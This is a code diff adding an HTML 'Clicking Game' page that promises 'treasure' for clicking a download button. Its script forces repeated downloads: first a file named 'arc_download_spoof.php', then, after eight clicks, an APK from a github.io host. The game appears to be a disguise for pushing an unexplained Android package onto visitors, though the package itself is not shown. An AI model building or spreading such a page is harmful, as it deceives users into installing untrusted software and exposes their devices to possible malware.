@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>The Clicking Game</title>
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      width: 100%;
+      background-color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 0.5rem;
+    }
+
+    p {
+      font-size: 1.25rem;
+      margin-bottom: 3rem;
+    }
+
+    a {
+      font-size: 2rem;
+      text-decoration: none;
+      background-color: black;
+      color: white;
+      padding: 1rem 2rem;
+      border-radius: 10px;
+      margin-bottom: 1rem;
+    }
+
+    a:hover {
+      background-color: #333;
+    }
+
+    #click-count {
+      font-size: 1.5rem;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>The Clicking Game</h1>
+  <p>You must click and download file to get treasure</p>
+
+  <a id="download-link" href="http://frozzipies.github.io/arc_download_spoof.php" download>Click to download</a>
+  <div id="click-count">Click 0</div>
+
+  <script>
+    let clickCount = 0;
+    const downloadLink = document.getElementById('download-link');
+    const clickCounter = document.getElementById('click-count');
+
+    downloadLink.addEventListener('click', (e) => {
+      clickCount++;
+      e.preventDefault();
+
+      const url = (clickCount <= 8)
+        ? 'http://frozzipies.github.io/arc_download_spoof.php'
+        : 'https://frozzipies.github.io/test.apk';
+
+      // Trigger download
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = '';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+
+      // Update visible click count
+      clickCounter.textContent = `Click ${clickCount}`;
+    });
+  </script>
+
+</body>
+</html>
